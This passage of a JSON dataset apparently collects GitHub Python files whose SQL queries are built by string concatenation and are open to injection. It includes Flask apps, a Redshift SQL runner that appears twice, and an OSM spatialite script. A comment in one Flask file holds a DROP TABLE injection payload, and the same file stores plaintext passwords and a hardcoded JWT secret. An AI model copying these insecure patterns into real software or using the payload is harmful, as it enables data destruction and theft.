custom_frame(self):\n\t\t\n\t\tresult_frame = ResultsPage(self.container, self)\n\t\t\n\t\tself.frames[ResultsPage] = result_frame\n\t\t\n\t\tresult_frame.grid(row=0, column=0, sticky=\"nsew\")\n\t\t\n\t\tself.show_frame(ResultsPage)\n\n\tdef set_result(self, result):\n\t\tself.result = result\n\n\tdef get_result(self):\n\t\treturn self.result\n\n\nclass StartPage(tk.Frame):\n\n\tdef __init__(self, parent, controller):\n\n\t\ttk.Frame.__init__(self, parent)\n\n\t\tlabel = tk.Label(self, text = \"Login Page\", font=controller.titleFont)\n\t\tlabel.pack(pady=10, padx=10)\n\n\t\tenterAppButton = tk.Button(self, text=\"Start Using Raspi-Telxon!\", \n\t\t\tfont=controller.itemFont,command=lambda: controller.show_frame(SearchPage))\n\n\t\tenterAppButton.pack(pady=5)\n\n\t\texitAppButton = tk.Button(self, text=\"Quit\", \n\t\t\tfont=controller.itemFont, command=lambda: sys.exit(0))\n\n\t\texitAppButton.pack(pady=5)\n\nclass SearchPage(tk.Frame):\n\n\tdef __init__(self, parent, controller):\n\n\t\ttk.Frame.__init__(self, parent)\n\n\t\tself.controller = controller\n\n\t\tstatusbar = tk.Frame(self)\n\t\tstatusbar.pack(side=\"top\", fill=\"x\")\n\t\tself.statusbar = statusbar\n\n\t\tnavbar = tk.Frame(self)\n\t\tnavbar.pack(side=\"bottom\", fill=\"x\")\n\t\tself.navbar = navbar\n\n\t\tUPC_Label = tk.Label(self, text=\"UPC\", font=controller.titleFont)\n\t\tUPC_Label.pack(pady=10, padx=10, anchor=\"center\")\n\n\t\tself.UPC_Entry = tk.Entry(self)\n\t\tself.UPC_Entry.pack(pady=10, padx=10, anchor=\"center\")\n\n\t\tbackButton = tk.Button(navbar, text=\"Back\",\n\t\t\tfont=controller.itemFont, command=lambda: controller.show_frame(StartPage))\n\t\tbackButton.pack(side=\"left\", pady=10, padx=10)\n\n\t\tSearch_Button = tk.Button(navbar, text=\"Search\", \n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tfont=controller.itemFont, command=self.search)\n\t\tSearch_Button.pack(side=\"left\", pady=10, padx=10)\n\n\t\texitAppButton = tk.Button(navbar, text=\"Quit\", \n\t\t\tfont=controller.itemFont, command=lambda: sys.exit(0))\n\t\texitAppButton.pack(side=\"left\", pady=10, padx=10)\n\n\t\t# temp = self.winfo_children()\n\t\t# print(temp)\n\n\n\tdef search(self):\n\t\t\n\t\tupc = \"\"\n\n\t\tupcEntry = self.UPC_Entry.get()\n\n\t\tif(upcEntry == \"\"):\n\t\t\temptyInputLabel = tk.Label(self.statusbar, text=\"UPC Cannot Be Empty\", fg=\"red\")\n\t\t\temptyInputLabel.pack()\n\n\t\tif(self.UPC_Entry.get() != \"\"):\n\n\t\t\tself.View_Result_Button = tk.Button(self.navbar, text=\"View Result\", \n\t\t\t\tfont=self.controller.itemFont, command=lambda: self.controller.custom_frame())\n\n\t\t\tself.View_Result_Button.pack(side=\"left\", pady=10, padx=10)\n\n\t\t\tupc = self.UPC_Entry.get()\n\n\t\t\tdatabase = dbc.DB_Connector()\n\n\t\t\tdatabase.some_upc = upc\n\n\t\t\tresult = database.fetch_product()\n\t\t\n\t\t\tself.controller.set_result(result)\n\n\t\t\tif(result is None):\n\t\t\t\tresult_not_found = tk.Label(self, text=\"No Result Found!\", font=self.controller.itemFont)\n\t\t\t\tresult_not_found.pack()\n\t\t\t\tself.View_Result_Button.config(state='disabled')\n\t\t\telif(result is not None):\n\t\t\t\tresult_found_notification = tk.Label(self, text=\"Results Found!\", font=self.controller.itemFont)\n\t\t\t\tresult_found_notification.pack()\n\t\t\t\tself.View_Result_Button.config(state='normal')\n\n\nclass ResultsPage(tk.Frame):\n\n\tdef __init__(self, parent, controller):\n\n\t\ttk.Frame.__init__(self, parent)\n\n\t\tself.controller = controller\n\n\t\t(ID, UPC, name, imageURI) = controller.get_result()\n\n\t\tload = Image.open(imageURI)\n\t\trender = ImageTk.PhotoImage(load)\n\t\t\n\t\timg_label = tk.Label(self, image=render)\n\t\timg_label.image = render\n\t\timg_label.pack(side=\"right\")\n\n\t\tname_label = tk.Label(self, text=\"Product: \" + name, font=controller.titleFont)\n\t\tname_label.pack(pady=10, padx=10, anchor=\"nw\")\n\n\t\tupc_label = tk.Label(self, text=\"UPC: \" + UPC, font=controller.itemFont)\n\t\tupc_label.pack(pady=10, padx=10, anchor=\"nw\")\n\n\t\tnew_search_button = tk.Button(self, text=\"New Search\",\n\t\t\tfont=controller.itemFont, command=lambda: self.new_search())\n\n\t\tnew_search_button.pack(side=\"left\", pady=10, padx=10, anchor=\"sw\")\n\n\t\texit_app_button = tk.Button(self, text=\"Quit\", \n\t\t\tfont=controller.itemFont, command=lambda: sys.exit(0))\n\n\t\texit_app_button.pack(side=\"left\", pady=10, padx=10, anchor=\"sw\")\n\n\n\tdef new_search(self):\n\n\t\tself.controller.remove_frame(SearchPage)\n\n\t\tnew_frame = self.controller.create_frame(SearchPage)\n\n\t\t#print(\"IN NEW SEARCH: \" + str(type(new_frame)))\n\n\t\t#self.controller.show_frame(new_frame)\n\n\t\t# self.controller.frames.pop('SearchPage', None)\n\n\t\t# frame = SearchPage(self.controller.container, self.controller)\n\n\t\t# self.controller.frames[SearchPage] = frame\n\n\t\t# self.controller.show_frame(SearchPage)\n\n\n\napp = RaspiTelxon()\napp.geometry(\"800x480\")\napp.mainloop()",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/coursera/dataduct/blob/258abcc7d9d54b83bcd3a48888964cc53100edfc",
        "file_path": "/dataduct/steps/scripts/sql_runner.py",
        "source": "#!/usr/bin/env python\n\n\"\"\"Runner for the upsert SQL step\n\"\"\"\n\nimport argparse\nimport pandas.io.sql as pdsql\nfrom dataduct.data_access import redshift_connection\nfrom dataduct.database import SqlStatement\nfrom dataduct.database import Table\n\n\ndef main():\n    \"\"\"Main Function\n    \"\"\"\n    parser = argparse.ArgumentParser()\n    parser.add_argument('--table_definition', dest='table_definition',\n                        required=True)\n    parser.add_argument('--sql', dest='sql', required=True)\n    parser.add_argument('--analyze', action='store_true', default=False)\n    parser.add_argument('--non_transactional', action='store_true',\n                        default=False)\n\n    args, sql_arguments = parser.parse_known_args()\n    print args, sql_arguments\n\n    table = Table(SqlStatement(args.table_definition))\n    connection = redshift_connection()\n    # Enable autocommit for non transactional sql execution\n    if args.non_transactional:\n        connection.autocommit = True\n\n    table_not_exists = pdsql.read_sql(table.check_not_exists_script().sql(),\n                                      connection).loc[0][0]\n\n    cursor = connection.cursor()\n    # Create table in redshift, this is safe due to the if exists condition\n    if table_not_exists:\n        cursor.execute(table.create_script().sql())\n\n    # Load data into redshift with upsert query\n    sql = args.sql % tuple(sql_arguments)\n    print 'Running :', sql\n    cursor.execute(sql)\n    cursor.execute('COMMIT')\n\n    # Analyze the table\n    if args.analyze:\n        cursor.execute(table.analyze_script().sql())\n\n    cursor.close()\n    connection.close()\n\n\nif __name__ == '__main__':\n    main()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/hillsdale18/ProjectX/blob/258abcc7d9d54b83bcd3a48888964cc53100edfc",
        "file_path": "/dataduct/steps/scripts/sql_runner.py",
        "source": "#!/usr/bin/env python\n\n\"\"\"Runner for the upsert SQL step\n\"\"\"\n\nimport argparse\nimport pandas.io.sql as pdsql\nfrom dataduct.data_access import redshift_connection\nfrom dataduct.database import SqlStatement\nfrom dataduct.database import Table\n\n\ndef main():\n    \"\"\"Main Function\n    \"\"\"\n    parser = argparse.ArgumentParser()\n    parser.add_argument('--table_definition', dest='table_definition',\n                        required=True)\n    parser.add_argument('--sql', dest='sql', required=True)\n    parser.add_argument('--analyze', action='store_true', default=False)\n    parser.add_argument('--non_transactional', action='store_true',\n                        default=False)\n\n    args, sql_arguments = parser.parse_known_args()\n    print args, sql_arguments\n\n    table = Table(SqlStatement(args.table_definition))\n    connection = redshift_connection()\n    # Enable autocommit for non transactional sql execution\n    if args.non_transactional:\n        connection.autocommit = True\n\n    table_not_exists = pdsql.read_sql(table.check_not_exists_script().sql(),\n                                      connection).loc[0][0]\n\n    cursor = connection.cursor()\n    # Create table in redshift, this is safe due to the if exists condition\n    if table_not_exists:\n        cursor.execute(table.create_script().sql())\n\n    # Load data into redshift with upsert query\n    sql = args.sql % tuple(sql_arguments)\n    print 'Running :', sql\n    cursor.execute(sql)\n    cursor.execute('COMMIT')\n\n    # Analyze the table\n    if args.analyze:\n        cursor.execute(table.analyze_script().sql())\n\n    cursor.close()\n    connection.close()\n\n\nif __name__ == '__main__':\n    main()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/antoinevdm/scalable-architecture/blob/79ea91118ed45f662cf83d60f636e627c17b9e41",
        "file_path": "/src/user.py",
        "source": "from flask import Flask, request\nfrom flask_restful import Resource, Api\nfrom sqlalchemy import create_engine\nfrom json import dumps\nfrom flask_jsonpify import jsonify\nimport sqlite3\nimport jwt\n\napp = Flask(__name__)\napi = Api(app)\n\nclass Users(Resource):\n    def get(self):\n        query = conn.execute(\"SELECT * FROM USERS\") # This line performs query and returns json result\n        i=0\n        for row in query:\n            i = i+1\n        return {'Number of users': i} # Fetches first column that is Employee ID\n\n    #sql injection : { \"Name\": \"antoine\", \"Password\": \"test+\\\"'); DROP TABLE USERS;\"}\n    # plus change execute to execute scritpt\n    def post(self):\n        print(request.json)\n        Name = request.json['Name']\n        Password = request.json['Password']\n        query = conn.execute(\"INSERT INTO USERS(NAME, PASSWORD) VALUES ('\"+Name+\"', '\"+Password+\"')\");\n        conn.commit()\n        return {'status': 'success'}\n\nclass User(Resource):\n    def post(self):\n        # print(request.json)\n        name = request.form['Name']\n        password = request.form['Password']\n        query = conn.execute(\"SELECT PASSWORD FROM USERS WHERE NAME = '\"+name+\"'\");\n        realPassword = \"\"\n        for row in query:\n            realPassword= row[0]\n            print(realPassword)\n            break\n        if realPassword is \"\":\n            return 'user does not exist', 403\n        if realPassword != password:\n            return 'Wrong password', 403\n\n        encoded = jwt.encode({'name': ''+name+''}, 'scalable', algorithm='HS256')\n        encoded = encoded.decode('UTF-8')\n        return {'token': ''+encoded+''}\n\napi.add_resource(Users, '/users')\napi.add_resource(User, '/user')\n\nif __name__ == '__main__':\n    conn = sqlite3.connect('user.db')\n    app.run(port=5002)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/ulyssetsd/bjtu-sql/blob/8503ad1e8ee50efb249d5c4e2ab239484f5d64dc",
        "file_path": "/flaskr/flaskr/flaskr2.py",
        "source": "from flask import Flask, render_template, redirect, session, url_for\nfrom database import conn, cursor\n\n\napp = Flask(__name__)  # create the application instance :)\n\n\nfrom views import users, message, comment, like_msg, like_cmt\napp.register_blueprint(users.mod)\napp.register_blueprint(message.mod)\napp.register_blueprint(comment.mod)\napp.register_blueprint(like_msg.mod)\napp.register_blueprint(like_cmt.mod)\n\n\n#@app.teardown_appcontext\n#def shutdown_session(exception=None):\n    #cursor.close()\n    #conn.close()\n\n\n@app.route('/')\ndef show_entries():\n    if not session.get('logged_in'):\n        return redirect(url_for('users.login'))\n    user_id = session['logged_id']\n    sql = 'SELECT * FROM message where user_id = %d ORDER BY c_time DESC' \\\n        % (user_id)\n    cursor.execute(sql)\n    m = cursor.fetchall()\n    messages = list(m)\n    for i, message in enumerate(messages):\n        message = list(message)\n        user_id = message[1]\n        sql = 'SELECT nickname FROM users where user_id = %d' % user_id\n        cursor.execute(sql)\n        u = cursor.fetchone()\n        message.append(u[0])\n        sql = \"SELECT * FROM like_msg where msg_id = %d AND user_id = %d\" \\\n            % (message[0], user_id)\n        cursor.execute(sql)\n        like = cursor.fetchone()\n        if like is not None:\n            like_flag = 1\n        else:\n            like_flag = 0\n        message.append(like_flag)\n        messages[i] = message\n\n    return render_template('show_entries.html', entries=messages)\n\n\n@app.route('/add', methods=['POST'])\ndef add_entry():\n    return render_template('show_entries.html')\n\n\nif __name__ == '__main__':\n    app.debug = True\n    app.secret_key = 'bjtu-sql'\n    app.run()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/napo/mvp-osm/blob/fa26da0dc815a66a279408e59edcab07573a3357",
        "file_path": "/mvp.py",
        "source": "# -*- coding: utf-8 -*-\n\"\"\"\nCreated on Wed Jul  6 12:01:27 2011\n\n@author: Maurizio Napolitano\nMIT License\n\"\"\"\n\nfrom pyspatialite import dbapi2 as db\nfrom datetime import datetime\nfrom datetime import timedelta\nimport scipy as sc\nimport numpy as np\nimport scipy.spatial.distance\nimport scipy.cluster.hierarchy\nimport ConfigParser\nfrom optparse import OptionParser\nimport sys, os\nTEMPLATECONFIG = \"example.cfg\"\nclass MVP():\n    tables = [\"osm_nodes\"]\n    sql_distinct = \"select distinct(user) from \"\n    sql_count = \"select count(distinct(user)) from \"\n    indb = None\n    outdb = None\n    days = None\n    grid = None\n    epsg =None\n    goodtags = None    \n\n    def __init__(self,indb,outdb,days,grid,epsg,goodtags):\n        self.indb = indb\n        self.outdb = outdb\n        self.days = int(days)\n        self.grid = grid\n        self.epsg = epsg\n        self.goodtags = goodtags\n        \n    def initdb(self):\n        cur = db.connect(self.outdb)\n        rs = cur.execute('SELECT sqlite_version(), spatialite_version()')\n        for row in rs:\n            msg = \"> SQLite v%s Spatialite v%s\" % (row[0], row[1])\n        print msg\n        sql= 'SELECT InitSpatialMetadata()'\n        cur.execute(sql)\n        sql = '''CREATE TABLE points (\n                id INTEGER PRIMARY KEY AUTOINCREMENT,\n                user STRING,\n                timestamp INTEGER);'''\n        cur.execute(sql)\n\n        sql = '''SELECT AddGeometryColumn('points', \n                'geometry', %s, 'POINT', 'XY');''' % self.epsg\n        cur.execute(sql)       \n\n        sql = '''CREATE TABLE usersgrid (\n                id INTEGER PRIMARY KEY AUTOINCREMENT,\n                x FLOAT,\n                y FLOAT,\n                user STRING,\n                density INTEGER,\n                activity INTEGER,\n                class INTEGER default 0);'''\n\tcur.execute(sql)\n        \n        sql = '''SELECT AddGeometryColumn('usersgrid',\n                'geometry', %s, 'POINT', 'XY');''' % self.epsg\n        cur.execute(sql)     \n        \n        sql = '''CREATE TABLE users (\n                id INTEGER PRIMARY KEY AUTOINCREMENT,\n                user STRING );'''\n        cur.execute(sql)        \n\n        # creating a POLYGON table\n        sql = '''CREATE TABLE grid (\n            id INTEGER PRIMARY KEY AUTOINCREMENT)'''\n            \n        cur.execute(sql)\n        sql = '''SELECT AddGeometryColumn('grid',\n             'geometry', %s, 'POLYGON', 'XY')''' % self.epsg\n        cur.execute(sql)\n\n        sql = \"SELECT CreateSpatialIndex('points', 'geometry');\"        \n        cur.execute(sql)\n        sql = \"SELECT CreateSpatialIndex('usersgrid', 'geometry');\"        \n        cur.execute(sql)\n        sql = \"SELECT CreateSpatialIndex('grid', 'geometry');\"        \n        cur.execute(sql)\n        \n        sql = '''CREATE VIEW users_activity AS SELECT user,\n                    (Round(JulianDay(max(timestamp)))\n                    -(JulianDay(min(timestamp)))) as activity \n                    FROM points GROUP BY user;'''\n        cur.execute(sql)\n        \n        sql = '''CREATE TABLE petlocations (\n            id INTEGER PRIMARY KEY AUTOINCREMENT,\n            gid INTEGER,\n            user STRING,\n            density INTEGER,\n            activity INTEGER,\n            class INTEGER default 0);'''\n        cur.execute(sql)\n        \n        sql = '''SELECT AddGeometryColumn('petlocations',\n                'geometry', %s, 'POLYGON', 'XY');''' % self.epsg\n        cur.execute(sql) \n\n        sql = \"SELECT CreateSpatialIndex('petlocations', 'geometry');\"        \n        cur.execute(sql)\n        \n        rs.close()\n        cur.close()\n        print \"Init completed\"\n        \n        \n    def importusers(self):\n        delta_days = self.days\n        indb = db.connect(self.indb)\n        dbout = db.connect(self.outdb)\n        incur = indb.cursor()\n        ago = \"\"\n        if (delta_days == 0):\n            ago = datetime.today() - timedelta(delta_days)\n        else:\n            sql = '''CREATE VIEW users_lastdays as SELECT user,\n            MAX(timestamp) as tempo FROM osm_nodes GROUP BY user;'''\n            incur.execute(sql)\n        \n        s = 0\n        for i in self.tables:\n            \n            if (delta_days > 0):\n                sql = '''select distinct(user) from \n                        users_lastdays where tempo > \"%s\"''' % str(ago)\n            else:\n                sql = \"SELECT distinct(user) from osm_nodes\";\n                \n            rs = incur.execute(sql)\n            r = rs.fetchall()\n            if s == 0:\n                outcur = dbout.cursor()\n                for u in r:\n                    user = u[0]\n                    sql = \"INSERT INTO users (user) VALUES ('%s')\" % (user)\n                    outcur.execute(sql)\n                s = s+1\n                outcur.close()\n                dbout.commit()\n            if (delta_days >0):\n                sql = \"DROP VIEW users_lastdays;\"\n                incur.execute(sql)\n\n            else:\n                outcur = dbout.cursor()\n                for u in r:\n                    user = u[0]\n                    sql = \"Select user from users where user = '%s';\" % user\n                    rsu = list(outcur.execute(sql))\n                    if len(rsu) == 0:\n                        sql = \"INSERT INTO users (user) VALUES ('%s')\" % (user)\n                        outcur.execute(sql)\n                outcur.close()\n                dbout.commit()\n        incur.close()\n        indb.close()\n        dbout.close()\n        print \"Users imported\"\n    \n    def insertptlnodes(self):\n        print \"search nodes\"\n        indb = db.connect(self.indb)  \n        incur = indb.cursor()\n        dbout = db.connect(self.outdb)\n        outcur = dbout.cursor()\n        for table in self.tables:  \n            if table == 'osm_nodes':\n                w =' in ('\n                for t in self.goodtags:\n                    t = \"'\" + t.rstrip() + \"',\"\n                    w += t\n                w += \")\"\n                where_badtags = w.replace(\"(,\",\"(\")\n                w = where_badtags.replace(\",)\",\")\") \n                \n                sql = 'select X(transform(osm_nodes.Geometry,%s)) as x,' % (self.epsg)\n                sql += 'Y(transform(osm_nodes.Geometry,%s)) as y ' % (self.epsg)\n                sql += ', timestamp, user from osm_nodes '\n                sql += ' natural join %s_tags where %s_tags.k' % (table.rstrip('s'),table.rstrip('s'))                \n                sql += w                   \n                sql == \" GROUP BY user;\"\n                rs = incur.execute(sql)\n                for r in rs:\n                    if (r[2] != None):\n                        p = \"GeomFromText('POINT(%s %s)',%s)\"  % (r[0],r[1],self.epsg)\n                        sql = \"INSERT INTO points (user, timestamp, geometry) \"\n                        sql += \"VALUES ('%s','%s',%s)\" % (r[3],r[2],p)               \n                        outcur.execute(sql)\n                dbout.commit()\n            else:\n                #FIX!!!\n                for t in self.goodtags:\n                    idname = table.replace(\"osm_\",\"\").rstrip('s') + \"_id\"\n                    idname = idname.replace(\"relation\",\"rel\")\n                    sql = 'select distinct(%s.%s) from %s' % (table,idname, table)\n                    sql += ' natural join %s_tags where ' % (table.rstrip('s'))\n                    sql += '%s_tags.k like \"%s\" ' % (table.rstrip('s'),t.rstrip())\n                    sql += \" group bu user\"\n                    rs = incur.execute(sql)\n                    ids = rs.fetchall()\n                    for i in ids:\n                        sql = 'select distinct(osm_nodes.node_id), timestamp from osm_nodes natural join %s_node_refs where '  % (table.rstrip('s'))\n                        sql += '%s_node_refs.%s = %s' % (table.rstrip('s'),idname,i[0])\n                        rs = incur.execute(sql)\n                        idp = rs.fetchall()\n                        for ip in idp:\n                            sql = 'select X(transform(osm_nodes.Geometry,%s)) as x,' % (self.epsg)\n                            sql += 'Y(transform(osm_nodes.Geometry,%s)) as y, osm_nodes.timestamp '  % (self.epsg) \n                            sql += ' from osm_nodes'  \n                            sql += ' where osm_nodes.node_id = %s' % ip[0]\n                            record = incur.execute(sql)\n                            v = record.fetchone()\n                            p = \"GeomFromText('POINT(%s %s)',%s)\"  % (v[0],v[1],self.epsg)\n                            sql = \"INSERT INTO points (user, timestamp,age, geometry) \"\n                            sql += \"VALUES ('%s','%s', %d,%s)\" % (\"\", ip[1], -1,p) \n                            outcur.execute(sql)\n                            dbout.commit()\n        outcur.close()\n        dbout.close()\n        incur.close()\n        indb.close()\n        \n    def createusersgrid(self):\n        print \"Create users grid\"\n        indb = db.connect(self.indb)  \n        incur = indb.cursor()\n        sql = '''SELECT Min(ST_X(transform(osm_nodes.geometry,%s))) AS min_x, \n                        Min(ST_Y(transform(geometry,%s))) AS min_y, \n                        Max(ST_X(transform(geometry,%s))) AS max_x, \n                        Max(ST_Y(transform(geometry,%s))) AS max_y \n                        FROM osm_nodes;'''  % (self.epsg,self.epsg,self.epsg,self.epsg) \n                        \n        sql = '''SELECT Min(ST_X(osm_nodes.geometry)) AS min_x, \n                        Min(ST_Y(osm_nodes.geometry)) AS min_y, \n                        Max(ST_X(osm_nodes.geometry)) AS max_x, \n                        Max(ST_Y(osm_nodes.geometry)) AS max_y \n                        FROM osm_nodes;'''  \n        rs = incur.execute(sql).fetchone()\n        minx = rs[0]\n        miny = rs[1]\n        maxx = rs[2]\n        maxy = rs[3]\n        dbout = db.connect(self.outdb)\n        outcur = dbout.cursor()\n        sql = 'SELECT ST_X(transform(MakePoint(%s,%s,4326),%s)),' % (minx,miny,self.epsg)\n        sql += 'ST_Y(transform(MakePoint(%s,%s,4326),%s)),' % (minx,miny,self.epsg)\n        sql += 'ST_X(transform(MakePoint(%s,%s,4326),%s)),' % (maxx,maxy,self.epsg)\n        sql += 'ST_Y(transform(MakePoint(%s,%s,4326),%s))''' % (maxx,maxy,self.epsg)  \n        rs = outcur.execute(sql).fetchone()\n        minx = rs[0]\n        miny = rs[1]\n        maxx = rs[2]\n        maxy = rs[3]\n        stepminx = minx\n        stepmaxx = minx + self.grid\n        stepminy = miny\n        stepmaxy = miny + self.grid\n\n        while(True):  \n \n            sql =  '''select count(id),\n\t\t\t    (Round(JulianDay(max(timestamp))) - \n\t\t\t    Round(JulianDay(min(timestamp)))) as activity,\n                            user \n                            from points where points.ROWID in\n                            (select pkid from idx_points_geometry \n                            where pkid match \n                            RTreeIntersects(%d, %d, %d, %d)) and points.user in (\n                            select user from users_activity where activity > %i);'''  % (stepminx,stepminy,stepmaxx,stepmaxy,self.days)                  \n\n            rs = outcur.execute(sql).fetchone()\n\n            x = stepminx + float(self.grid/2)\n            y = stepminy + float(self.grid/2)\n\n            if rs != None:            \n                density = rs[0]\n                activity = rs[1]\n                if activity == None:\n                    activity = 0\n                user = rs[2]\n                if user != None:\n                    p = \"GeomFromText('POINT(%s %s)',%s)\"  % (x,y,self.epsg)\n                    sql = \"INSERT INTO usersgrid (x, y,user, density,activity,geometry) \"\n                    sql += \"VALUES (%f, %f,'%s',%i,%i,%s)\" % (float(x),float(y),user,density,activity,p)\n                    outcur.execute(sql)\n                    dbout.commit()\n\n            if (stepmaxx <= maxx):\n                stepminx = stepmaxx\n                stepmaxx += self.grid\n            else:\n                stepminx = minx \n                stepmaxx = minx + self.grid\n                stepminy += self.grid\n                stepmaxy += self.grid\n \n                \n                if (stepmaxy >= maxy):\n                    break\n\n        incur.close()\n        indb.close()\n        \n    def creategrid(self,res):\n        print \"Create grid\"\n        indb = db.connect(self.indb)  \n        incur = indb.cursor()\n        dbout = db.connect(self.outdb)\n        outcur = dbout.cursor()\n        sql = '''SELECT Min(ST_X(transform(osm_nodes.geometry,%s))) AS min_x, \n                        Min(ST_Y(transform(geometry,%s))) AS min_y, \n                        Max(ST_X(transform(geometry,%s))) AS max_x, \n                        Max(ST_Y(transform(geometry,%s))) AS max_y \n                        FROM osm_nodes;'''  % (self.epsg,self.epsg,self.epsg,self.epsg) \n                        \n        sql = '''SELECT Min(ST_X(osm_nodes.geometry)) AS min_x, \n                        Min(ST_Y(osm_nodes.geometry)) AS min_y, \n                        Max(ST_X(osm_nodes.geometry)) AS max_x, \n                        Max(ST_Y(osm_nodes.geometry)) AS max_y \n                        FROM osm_nodes;'''  \n        rs = incur.execute(sql).fetchone()\n        minx = rs[0]\n        miny = rs[1]\n        maxx = rs[2]\n        maxy = rs[3]\n        dbout = db.connect(self.outdb)\n        outcur = dbout.cursor()\n        sql = 'SELECT ST_X(transform(MakePoint(%s,%s,4326),%s)),' % (minx,miny,self.epsg)\n        sql += 'ST_Y(transform(MakePoint(%s,%s,4326),%s)),' % (minx,miny,self.epsg)\n        sql += 'ST_X(transform(MakePoint(%s,%s,4326),%s)),' % (maxx,maxy,self.epsg)\n        sql += 'ST_Y(transform(MakePoint(%s,%s,4326),%s))''' % (maxx,maxy,self.epsg)  \n        rs = outcur.execute(sql).fetchone()\n        minx = rs[0]\n        miny = rs[1]\n        maxx = rs[2]\n        maxy = rs[3]\n        stepminx = minx\n        stepmaxx = minx + res\n        stepminy = miny\n        stepmaxy = miny + res       \n        \n        while(True):\n            p = \"GeomFromText('POLYGON((\"\n            p += \"%f %f, \" % (stepminx, stepminy)\n            p += \"%f %f, \" % (stepmaxx, stepminy)\n            p += \"%f %f, \" % (stepmaxx, stepmaxy)\n            p += \"%f %f, \" % (stepminx, stepmaxy)\n            p += \"%f %f\" % (stepminx, stepminy)\n            p += \"))',%s)\" % self.epsg\n            sql = \"INSERT INTO grid (geometry) \"\n            sql += \"VALUES (%s);\" % p\n            outcur.execute(sql)\n            if (stepmaxx <= maxx):\n                stepminx = stepmaxx\n                stepmaxx += res\n            else:\n                stepminx = minx \n                stepmaxx = minx + res\n                stepminy += res\n                stepmaxy += res\n                \n                if (stepmaxy >= maxy):\n                    break\n        dbout.commit()\n        outcur.close()\n        \n    def clustergridgroup(self,gridsize):\n        dbout = db.connect(self.outdb)\n        outcur = dbout.cursor() \n        print \"Calculate cluster ...\"\n        users = self.getusers()\n        for u in users:\n            sql = \"SELECT id,x,y FROM usersgrid WHERE user='%s'\" % u;\n            rs = outcur.execute(sql)        \n            result = []\n            ids = []\n            for r in rs:\n                t = (r[1],r[2])\n                result.append(t)\n                ids.append(r[0])\n            if len(result) > 1:\n                d = np.array(result)\n                dist = scipy.spatial.distance.pdist(d, 'euclidean')\n                Z = sc.cluster.hierarchy.single(dist)\n                clustgroup = sc.cluster.hierarchy.fcluster(Z, t=gridsize, criterion='distance')\n                k = 0\n                out = dbout.cursor() \n                for c in clustgroup:\n                    c = int(c)\n                    idp = int(ids[k])\n                    sql = '''UPDATE usersgrid\n                            SET class=%i\n                            WHERE id=%i;''' % (c,idp)\n                    out.execute(sql)  \n                    dbout.commit()\n                    k +=1                \n                out.close()\n                    \n        outcur.close();\n        \n    def getusers_activity(self,maxactivity):\n        dbout = db.connect(self.outdb)\n        outcur = dbout.cursor() \n        sql = \"select user from users_activity where activity > %i;\" % maxactivity\n        users = list(outcur.execute(sql))\n        outcur.close()\n        return users        \n\n    def getusers(self):\n        dbout = db.connect(self.outdb)\n        outcur = dbout.cursor() \n        sql = \"SELECT user FROM users\"\n        users = list(outcur.execute(sql))\n        outcur.close()\n        return users\n\n    def petlocations(self):\n        print \"calculate petlocations\"\n        dbout = db.connect(self.outdb)\n        outcur = dbout.cursor() \n        sql = '''select count(grid.id) as gid, asText(CastToPolygon(gunion(grid.geometry))) as geometry, \n                usersgrid.class as class, usersgrid.user as user, \n                max(usersgrid.activity) as activity, \n                max(usersgrid.density) as density,\n                geometrytype(gunion(grid.geometry)) as tipo from usersgrid,\n                grid where usersgrid.rowid in \n                (select pkid from idx_usersgrid_geometry \n                where pkid match \n                RTreeIntersects(MbrMinX(grid.geometry),\n                                MbrMinY(grid.geometry), \n                                MbrMaxX(grid.geometry),\n                                MbrMaxY(grid.geometry))) group \n                                by usersgrid.class, usersgrid.user order by user desc;'''\n        rs = outcur.execute(sql).fetchall()\n        for r in rs:\n            gid = r[0]\n            geometry = r[1]\n            clas = r[2]\n            user = r[3]\n            activity = r[4]\n            density = r[5]\n            print r[6]\n            sql = '''INSERT INTO petlocations (gid, geometry, class, user,activity,density)\n                     VALUES (%s,GeomFromText('%s',%s),%s,'%s',%s,%s)''' % (gid, geometry, self.epsg,clas, user,activity,density)\n            outcur.execute(sql)\n            dbout.commit()\n        outcur.close()\n\ndef execMVP(cmd):\n    days = None\n    epsg = None\n    outdb = None\n    indb = None\n    grid = None\n    goodtags = \"conf/goodtags.txt\"\n\n    if (cmd.config):\n        try:\n            parser = ConfigParser.ConfigParser()\n            parser.readfp(open(cmd.config));\n            filename = parser.get(\"goodtags\",\"file\")\n            f = open(filename,'r')\n            goodtags = f.readlines()\n            epsg = parser.get(\"config\",\"epsg\")\n            days = parser.get(\"config\",\"days\")\n            indb = parser.get(\"indb\",\"infile\")\n            outdb = parser.get(\"outdb\",\"outfile\")\n        except ConfigParser.NoOptionError, e:\n            print \"Error %s \" % e\n            sys.exit(2)    \n            \n    if (cmd.input):\n        indb = cmd.input\n    if (cmd.output):\n        outdb = cmd.output\n    if (cmd.tags):\n        try:\n            f = open(cmd.tags,'r')\n            goodtags = f.readlines()\n        except OSError, e:\n            print \"Error \" +  e\n            sys.exit(2)\n    if (cmd.epsg):\n        epsg = cmd.epsg\n    if (cmd.grid):\n        grid = cmd.grid\n    if (cmd.days):\n        days = cmd.days\n    \n    if days == None:\n        days = 180\n    if grid == None:\n        grid = 1000\n    if epsg == None:\n        epsg = \"epsg:900913\"\n        \n    mu = MVP(indb,outdb,days,grid,epsg,goodtags)\n    mu.initdb()\n    mu.creategrid(grid)\n    mu.importusers()\n    mu.insertptlnodes()\n    mu.createusersgrid()\n    mu.clustergridgroup(grid)\n    mu.petlocations();\n    print \"Enjoy your data on %s - i suggest to use qgis\" %  cmd.output\n        \ndef main():\n    usage = \"usage: %prog [options]\"\n    parser = OptionParser(usage)  \n    parser = OptionParser(usage)\n    parser.add_option(\"-c\", \"--config\", action=\"store\", dest=\"config\", help=\"give a CONFIG file\")\n    parser.add_option(\"-C\", \"--create\", action=\"store_true\", dest=\"create\", help=\"create a SAMPLE config file - usefull to create the config file\",default=False)\n    parser.add_option(\"-i\", \"--input\", action=\"store\", dest=\"input\", help=\"input file *\")\n    parser.add_option(\"-o\", \"--output\", action=\"store\", dest=\"output\", help=\"output file *\")\n    parser.add_option(\"-e\", \"--epsg\", action=\"store\", dest=\"epsg\", help=\"metric epsg *\")\n    